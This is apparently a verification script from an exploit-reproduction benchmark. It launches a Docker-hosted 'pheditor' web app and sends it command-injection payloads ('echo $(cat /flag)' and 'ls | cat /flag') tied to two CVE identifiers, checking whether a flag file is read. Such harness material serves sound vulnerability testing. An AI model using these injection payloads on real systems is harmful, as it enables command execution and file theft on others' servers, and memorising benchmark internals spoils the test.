#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = RUN_FLAG in terminal JSON body; 10 = blocked / not observed; 20 = env; 30 = usage
# seed:    echo $(cat /flag)          (CVE-2026-54540)
# residual: ls | cat /flag            (CVE-2026-55578; inline, never seed fallback, never heldout)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
  if [[ -n "$CID" ]]; then
    PORT="$(docker port "$CID" 80 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
  fi
fi
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:80" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_TARGET_BASE="http://127.0.0.1:${PORT}/pheditor"

if [[ "$MODE" == "--seed" ]]; then
  RAW="$("$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null || true)"
  "$PY" - "$RAW" > "$WORK_DIR/cand.json" <<'PY'
import json, sys
s = (sys.argv[1] if len(sys.argv) > 1 else "").strip()
cmd = "echo $(cat /flag)"
if s:
    try:
        d = json.loads(s)
        if isinstance(d, dict) and d.get("command"):
            cmd = d["command"]
        elif isinstance(d, str) and d:
            cmd = d
        else:
            cmd = s
    except Exception:
        cmd = s
print(json.dumps({"command": cmd}))
PY
else
  # Inline residual pipe payload. Do not call original_poc. Do not read heldout.
  printf '%s\n' '{"command":"ls | cat /flag"}' > "$WORK_DIR/cand.json"
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "${OUT:0:500}"
BODY="$(printf '%s' "$OUT" | "$PY" -c "
import json, sys
raw = sys.stdin.read()
try:
    d = json.loads(raw)
except Exception:
    print('')
    raise SystemExit(0)
print(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or '')
" 2>/dev/null)" || BODY=""
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
